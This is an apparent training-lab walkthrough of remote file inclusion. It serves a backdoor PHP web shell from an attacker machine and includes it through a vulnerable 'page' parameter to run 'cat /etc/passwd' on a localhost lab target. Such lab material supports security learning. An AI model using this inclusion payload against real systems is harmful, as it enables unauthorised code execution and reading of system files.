# Web Shell with Remote File Inclusion (RFI)

## Lab 22: Insecure Direct Object Reference - Web Shell with Remote File Inclusion (RFI)

<figure><img src="../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>

Go to lab page: [https://127.0.0.1/index.php?page=labs/lab-22.php](https://127.0.0.1/index.php?page=labs/lab-22.php)

The idea is to upload via RFI a web shell to execute directly on the website vulnerable. In this case, i decided to utilize 'simple-backdoor.php'.

<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

On the attacker machine (10.0.2.15) we can run a python web server using:&#x20;

`python3 -m http.server 1339`

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

and reach it concatenating to IP:PORT file\_name and & cmd=command as below:

[https://127.0.0.1/index.php?page=http://10.0.2.15:1339/simple-backdoor.php\&cmd=cat+/etc/passwd](https://127.0.0.1/index.php?page=http://10.0.2.15:1339/simple-backdoor.php\&cmd=cat+/etc/passwd)

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

The correct answer is the last of the list: The plus symbol is the encoded character representing a space ' '. We have to encode the space character to prevent Apache web server from thinking the space marks the end of the URL.
